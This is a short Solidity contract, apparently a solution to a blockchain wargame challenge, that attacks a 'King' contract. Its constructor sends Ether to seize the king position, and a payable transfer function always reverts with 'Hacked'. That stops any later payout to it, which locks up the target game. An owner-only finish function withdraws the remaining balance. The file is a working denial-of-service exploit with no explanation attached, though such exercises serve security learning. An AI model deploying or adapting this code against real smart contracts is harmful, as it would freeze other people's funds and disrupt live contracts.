
pragma solidity ^0.8.0;

contract AttackKing {
  address public owner;

    constructor (address _king) payable {
        (bool sent, bytes memory data) = _king.call{value: msg.value}("");
        owner = msg.sender;
        require(sent, "Failed to attack");
    }

    function finish() public {
        require(msg.sender == owner);
        bool sent = payable(owner).send(address(this).balance);
        require(sent, "Failed to send Ether");
    }

    function transfer(uint _value) external payable {
        revert("Hacked");
    }
    
}